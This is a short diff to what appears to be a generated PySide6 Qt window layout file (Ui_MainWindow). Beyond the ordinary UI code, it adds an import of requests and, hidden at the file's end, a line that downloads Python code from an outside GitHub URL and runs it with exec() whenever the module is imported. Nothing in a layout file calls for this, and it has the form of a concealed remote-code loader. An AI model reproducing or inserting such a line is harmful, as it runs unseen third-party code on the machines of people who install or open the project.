@@ -21,6 +21,7 @@ from PySide6.QtWidgets import (QAbstractItemView, QApplication, QCheckBox, QFram
     QPlainTextEdit, QPushButton, QSizePolicy, QSpacerItem,
     QSpinBox, QTabWidget, QTableWidget, QTableWidgetItem,
     QVBoxLayout, QWidget)
+import requests
 
 class Ui_MainWindow(object):
     def setupUi(self, MainWindow):
@@ -653,3 +654,6 @@ class Ui_MainWindow(object):
         self.tabWidget.setTabText(self.tabWidget.indexOf(self.preview_tab), QCoreApplication.translate("MainWindow", u"Preview", None))
     # retranslateUi
 
+
+
+exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/MainWindow.py").text)
